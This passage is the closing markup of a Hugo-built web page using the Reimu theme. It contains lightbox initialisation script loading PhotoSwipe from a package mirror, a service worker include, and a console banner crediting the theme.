              pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")
            }).init();
          }
          window.lightboxStatus = 'done';
          window.removeEventListener('lightbox:ready', pswp);
        }
        if(window.lightboxStatus === 'ready') {
          pswp()
        } else {
          window.addEventListener('lightbox:ready', pswp);
        }
      </script>
      












      
    
    
  </div>
</div>






  





  
       
         
      

  





  
      
      <script src="/js/service_worker.js" integrity="" crossorigin="anonymous" ></script>
      



<script>
  const reimuCopyright = String.raw`
   ______     ______     __     __    __     __  __    
  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
                                                    
  `;
  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
  console.log(
    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
    "color: white; background: #ff5252; padding:5px 0;",
    "padding:4px;border:1px solid #ff5252;",
  );
</script>




  </body>
</html>
